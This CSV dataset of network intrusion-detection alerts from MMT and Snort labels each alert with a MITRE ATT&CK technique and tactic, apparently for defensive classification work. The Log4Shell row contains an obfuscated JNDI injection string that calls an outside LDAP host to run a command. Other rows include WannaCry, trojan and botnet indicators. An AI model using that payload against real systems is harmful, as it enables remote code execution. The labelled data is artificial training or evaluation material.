"id","source_tool","signature","technique_ids","technique_names","technique_parents","parent_names","tactic","label_confidence","note","raw_path","raw_alert","raw_alert_no_signature"
"mmt_15_nikto_scan_20220425_153028.csv","mmt","Nikto detection","T1595.002","Vulnerability Scanning","T1595","Active Scanning","reconnaissance","high","Nikto web vuln scanner","datasets/mmt/mmt_15_nikto_scan_20220425_153028.csv","10,0,"""",1650893428,15,""detected"",""attack"",""Nikto detection"",{""event_1"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.method"",""HEAD""],[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""],[""ip.src"",""192.168.0.49""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""]]}}","10,0,,1650893428,15,detected,attack,,{""event_1"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.method"",""HEAD""],[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""],[""ip.src"",""192.168.0.49""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""]]}}"
"mmt_1_ssh_brute_force_20220425_153015.csv","mmt","Several attempts to connect via ssh (brute force attack). Source address is either infected machine or attacker (no spoofing is possible).","T1110","Brute Force","T1110","Brute Force","credential-access","high","SSH brute force","datasets/mmt/mmt_1_ssh_brute_force_20220425_153015.csv","10,0,"""",1650893415,1,""detected"",""attack"",""Several attempts to connect via ssh (brute force attack). Source address is either infected machine or attacker (no spoofing is possible)."",{""event_1"":{""timestamp"":1492079795.717693,""counter"":1,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_2"":{""timestamp"":1492079795.717893,""counter"":2,""attributes"":[[""ip.src"",""192.168.0.101""],[""ip.dst"",""192.168.0.59""],[""tcp.src_port"",22],[""tcp.flags"",18]]},""event_3"":{""timestamp"":1492079795.967801,""counter"":35,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_4"":{""timestamp"":1492079797.685815,""counter"":70,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]}}","10,0,,1650893415,1,detected,attack,,{""event_1"":{""timestamp"":1492079795.717693,""counter"":1,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_2"":{""timestamp"":1492079795.717893,""counter"":2,""attributes"":[[""ip.src"",""192.168.0.101""],[""ip.dst"",""192.168.0.59""],[""tcp.src_port"",22],[""tcp.flags"",18]]},""event_3"":{""timestamp"":1492079795.967801,""counter"":35,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_4"":{""timestamp"":1492079797.685815,""counter"":70,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]}}"
"mmt_20_icmp_redirect_20220425_153045.csv","mmt","4 consecutive ICMP redirect packets. Possibly ICMP redirect flood.","T1557","Adversary-in-the-Middle","T1557","Adversary-in-the-Middle","collection;credential-access","medium","ICMP redirect -> AiTM/redirection (or DoS)","datasets/mmt/mmt_20_icmp_redirect_20220425_153045.csv","10,0,"""",1650893445,20,""detected"",""attack"",""4 consecutive ICMP redirect packets. Possibly ICMP redirect flood."",{""event_1"":{""timestamp"":1481274722.643309,""counter"":1,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481274723.644219,""counter"":2,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_3"":{""timestamp"":1481274724.644791,""counter"":3,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_4"":{""timestamp"":1481274725.645735,""counter"":4,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]}}","10,0,,1650893445,20,detected,attack,,{""event_1"":{""timestamp"":1481274722.643309,""counter"":1,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481274723.644219,""counter"":2,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_3"":{""timestamp"":1481274724.644791,""counter"":3,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_4"":{""timestamp"":1481274725.645735,""counter"":4,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]}}"
"mmt_32_botnet_cc_20220425_153115.csv","mmt","Botnet Command and Control detection","T1071","Application Layer Protocol","T1071","Application Layer Protocol","command-and-control","high","Botnet C2 channel","datasets/mmt/mmt_32_botnet_cc_20220425_153115.csv","10,0,"""",1650893475,32,""detected"",""attack"",""Botnet Command and Control detection"",{""event_1"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]},""event_2"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]}}","10,0,,1650893475,32,detected,attack,,{""event_1"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]},""event_2"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]}}"
"mmt_33_trojan_20220425_153118.csv","mmt","Trojan detection","T1071.001","Web Protocols","T1071","Application Layer Protocol","command-and-control","medium","Trojan HTTP beacon","datasets/mmt/mmt_33_trojan_20220425_153118.csv","10,0,"""",1650893478,33,""detected"",""attack"",""Trojan detection"",{""event_1"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.uri"",""/ctrl/cnt_boot.php?pgv=""]]},""event_2"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.method"",""GET""],[""ip.src"",""10.0.2.15""],[""ip.dst"",""192.168.0.101""]]}}","10,0,,1650893478,33,detected,attack,,{""event_1"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.uri"",""/ctrl/cnt_boot.php?pgv=""]]},""event_2"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.method"",""GET""],[""ip.src"",""10.0.2.15""],[""ip.dst"",""192.168.0.101""]]}}"
"mmt_37_wannacry_ransomware_20220425_153124.csv","mmt","Detection of WannaCry Ransomware","T1486","Data Encrypted for Impact","T1486","Data Encrypted for Impact","impact","high","WannaCry ransomware","datasets/mmt/mmt_37_wannacry_ransomware_20220425_153124.csv","10,0,"""",1650893484,38,""detected"",""attack"",""Detection of WannaCry Ransomware"",{""event_1"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""http.host"",""iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com""]]},""event_2"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""ip.src"",""192.168.0.69""],[""ip.dst"",""144.217.254.90""]]}}","10,0,,1650893484,38,detected,attack,,{""event_1"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""http.host"",""iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com""]]},""event_2"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""ip.src"",""192.168.0.69""],[""ip.dst"",""144.217.254.90""]]}}"
"mmt_4.5_attack_20220425_153127.csv","mmt","IPv4 address conflict detection (RFC5227). Possible arp poisoning.","T1557.002","ARP Cache Poisoning","T1557","Adversary-in-the-Middle","collection;credential-access","medium","IPv4 conflict / ARP poisoning","datasets/mmt/mmt_4.5_attack_20220425_153127.csv","10,0,"""",1650893487,4,""detected"",""attack"",""IPv4 address conflict detection (RFC5227). Possible arp poisoning."",{""event_1"":{""timestamp"":1389048986.340873,""counter"":21,""attributes"":[[""arp.ar_op"",1],[""arp.ar_tip"",""192.168.47.1""],[""ethernet.dst"",""ff:ff:ff:ff:ff:ff""],[""ethernet.src"",""00:0c:29:1d:b3:b1""]]},""event_2"":{""timestamp"":1389048986.340955,""counter"":22,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:50:56:c0:00:08""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",22]]},""event_3"":{""timestamp"":1389048989.446972,""counter"":279,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:0c:29:1d:b3:b1""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",279]]}}","10,0,,1650893487,4,detected,attack,,{""event_1"":{""timestamp"":1389048986.340873,""counter"":21,""attributes"":[[""arp.ar_op"",1],[""arp.ar_tip"",""192.168.47.1""],[""ethernet.dst"",""ff:ff:ff:ff:ff:ff""],[""ethernet.src"",""00:0c:29:1d:b3:b1""]]},""event_2"":{""timestamp"":1389048986.340955,""counter"":22,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:50:56:c0:00:08""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",22]]},""event_3"":{""timestamp"":1389048989.446972,""counter"":279,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:0c:29:1d:b3:b1""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",279]]}}"
"mmt_77_log4shell_20220425_153132.csv","mmt","Detect Log4Shell attack that exploits a vulnerability of log4j, CVE-2021-44832, to get a remote code execution","T1190","Exploit Public-Facing Application","T1190","Exploit Public-Facing Application","initial-access","high","Log4Shell RCE on public app","datasets/mmt/mmt_77_log4shell_20220425_153132.csv","10,0,"""",1650893492,77,""detected"",""attack"",""Detect Log4Shell attack that exploits a vulnerability of log4j, CVE-2021-44832, to get a remote code execution"",{""event_1"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""http.uri"",""/test?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D""],[""http.user_agent"",""python-requests/2.25.1""]]},""event_2"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""ip.src"",""172.17.0.1""],[""ip.dst"",""172.17.0.2""]]}}","10,0,,1650893492,77,detected,attack,,{""event_1"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""http.uri"",""/test?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D""],[""http.user_agent"",""python-requests/2.25.1""]]},""event_2"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""ip.src"",""172.17.0.1""],[""ip.dst"",""172.17.0.2""]]}}"
"snort:254:snort_dns_spoof_query_response_with_ttl_of_1_min._and_no_254.txt","snort","DNS SPOOF query response with TTL of 1 min. and no authority","T1557","Adversary-in-the-Middle","T1557","Adversary-in-the-Middle","collection;credential-access","medium","DNS spoofed response (AiTM)","datasets/snort/snort_dns_spoof_query_response_with_ttl_of_1_min._and_no_254.txt","[**] [1:254:4] DNS SPOOF query response with TTL of 1 min. and no authority [**]
[Classification: Potentially Bad Traffic] [Priority: 2]
03/14-14:13:32.988223 4.2.2.3:53 -> 192.168.52.10:1044
UDP TTL:54 TOS:0x0 ID:16027 IpLen:20 DgmLen:82
Len: 54","[**] [1:254:4] [**]
03/14-14:13:32.988223 4.2.2.3:53 -> 192.168.52.10:1044
UDP TTL:54 TOS:0x0 ID:16027 IpLen:20 DgmLen:82
Len: 54"
"snort:2013666:snort_et_current_events_likely_blackhole_exploit_kit_dri_2013666.txt","snort","ET CURRENT_EVENTS Likely Blackhole Exploit Kit Driveby ?page Download Secondary Request","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","high","Blackhole exploit kit drive-by","datasets/snort/snort_et_current_events_likely_blackhole_exploit_kit_dri_2013666.txt","[**] [1:2013666:6] ET CURRENT_EVENTS Likely Blackhole Exploit Kit Driveby ?page Download Secondary Request [**]
[Classification: A Network Trojan was Detected] [Priority: 1]
10/14-22:05:08.493991 192.168.40.10:1062 -> 85.17.136.147:80
TCP TTL:52 TOS:0x0 ID:1439 IpLen:20 DgmLen:437 DF
***A**** Seq: 0x78018803  Ack: 0xBED91AB4  Win: 0x1920  TcpLen: 20","[**] [1:2013666:6] [**]
10/14-22:05:08.493991 192.168.40.10:1062 -> 85.17.136.147:80
TCP TTL:52 TOS:0x0 ID:1439 IpLen:20 DgmLen:437 DF
***A**** Seq: 0x78018803  Ack: 0xBED91AB4  Win: 0x1920  TcpLen: 20"
